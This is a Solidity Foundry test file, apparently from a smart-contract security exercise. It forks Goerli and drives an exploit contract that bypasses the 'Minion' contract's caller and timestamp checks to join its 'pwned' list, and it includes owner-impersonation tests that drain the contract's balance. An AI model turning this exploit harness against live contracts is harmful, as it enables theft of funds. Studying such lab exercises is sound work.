// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../src/interface.sol";
import "../src/MockAccessControl.sol";
import "../src/MockAccessControlExploit.sol";


/*
try akutarNft.processRefunds(){
        } catch Error(string memory Exception) {
            console.log("processRefunds() REVERT : ", Exception);
        }
*/
contract ContractTest is DSTest{

    Minion public _minionContract;
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D); // Foundry Cheatcodes
    address public _minionAddr = 0x6C6027384121b31C455cF3883bd2049460EdFC7A; // contract deployed on Goerli
    MockAccessControlExploit public exploitContract;

    function setUp() public {
        cheats.createSelectFork("https://rpc.ankr.com/eth_goerli", 8190984); //for Goerli at block 8190984
        _minionContract = Minion(_minionAddr);
    }

    function test_addUserToPwned() public{

        cheats.warp(8190985); //move to block.timestamp that satisfies the condition #5
        //check of condition #5 (i.e block.timestamp is with in a range) returns true then initiate the transaction
        if(block.timestamp % 120 >= 0 && block.timestamp % 120 < 60){
            console.log("Lets Go!!");
            
            //Fund the exploit contract
            //The constructor is payable and already has the exploit code ready as part of the constructor - Ref - MockAccessControlExploit.sol
            exploitContract = new MockAccessControlExploit{value: 2 ether}(address(_minionContract));

            //Verify if the address(exploitContract) is added to the pwned list
            console.log("address of exploitContract: ", address(exploitContract));
            console.log("verify ifPwned:", _minionContract.verify(address(exploitContract)));
        }
    }

    function test_addUserToPwnedviaContract() public {
        
        cheats.warp(8190985); //move to block.timestamp that satisfies the condition #5
        //check of condition #5 (i.e block.timestamp is with in a range) returns true then initiate the transaction
        if(block.timestamp % 120 >= 0 && block.timestamp % 120 < 60){
            console.log("Lets Go!!");
            
            cheats.prank(address(this)); //send a tx as contract address

            try _minionContract.pwn{value:0.2 ether}(){
            } catch Error(string memory Exception) {
                console.log("test_addUserToPwnedviaContract() REVERT : ", Exception);
            }
        }
    }

    function test_ownerTakeover() public{
        
        console.log("Minion Contract Balance before: " , _minionAddr.balance);
        
        //Simulate Funding of contract with 2 ether to pass the condition - 'address(this).balance > 0'
        cheats.deal(_minionAddr, 2 ether);

        console.log("Minion Contract Balance after contributionAmount: " , _minionAddr.balance);
        console.log("Malicious Owner Balance before retrieve():", _minionContract.owner().balance);

        //impersonate the owner and call 'retrieve()'
        cheats.prank(_minionContract.owner());

        _minionContract.retrieve();

        console.log("Minion Contract Balance after retrieve(): " , _minionAddr.balance);
        console.log("Malicious Owner Balance after retrieve():", _minionContract.owner().balance);
    }

    function test_nonOwnerTakeover() public {

        address notOwner = 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4;
        console.log("Minion Contract Balance before: " , _minionAddr.balance);
        
        //Simulate Funding of contract with 2 ether to pass the condition - 'address(this).balance > 0'
        cheats.deal(_minionAddr, 2 ether);

        console.log("Minion Contract Balance after contributionAmount: " , _minionAddr.balance);
        console.log("Malicious Owner Balance before retrieve():", _minionContract.owner().balance);

        //impersonate the owner and call 'retrieve()'
        cheats.prank(notOwner);

        try _minionContract.retrieve(){
        } catch Error(string memory Exception) {
            console.log("test_nonOwnerTakeover() REVERT : ", Exception);
        }

        console.log("Minion Contract Balance after retrieve(): " , _minionAddr.balance);
    }
} 
